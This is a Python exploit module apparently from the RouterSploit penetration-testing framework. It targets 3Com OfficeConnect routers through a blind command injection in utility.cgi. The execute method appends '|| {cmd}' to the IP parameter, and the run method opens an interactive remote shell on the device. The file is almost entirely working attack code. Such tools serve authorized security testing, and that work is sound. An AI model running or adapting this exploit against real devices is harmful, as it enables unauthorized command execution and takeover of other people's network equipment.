from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "3Com OfficeConnect RCE",
        "description": "Module exploits 3Com OfficeConnect remote command execution "
                       "vulnerability which allows executing command on operating system level.",
        "authors": (
            "Andrea Fabizi",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/9862/",
        ),
        "devices": (
            "3Com OfficeConnect",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response1 = self.http_request(
            method="GET",
            path="/utility.cgi?testType=1&IP=aaa",
        )

        if response1 and response1.status_code == 200:
            path = "/{}.cgi".format(utils.random_text(32))

            response2 = self.http_request(
                method="GET",
                path=path,
            )

            if not response2 or response1.text != response2.text:
                print_success("Target appears to be vulnerable")
                print_status("Invoking command loop...")
                print_status("It is blind command injection - response is not available")
                shell(self, architecture="mipsbe")
            else:
                print_error("Exploit failed - target does not seem to be vulnerable")
        else:
            print_error("Exploit failed - target does not seem to be vulnerable")

    def execute(self, cmd):
        path = "/utility.cgi?testType=1&IP=aaa || {}".format(cmd)

        self.http_request(
            method="GET",
            path=path,
        )
        return ""

    @mute
    def check(self):
        return None  # there is no reliable way to check if target is vulnerable
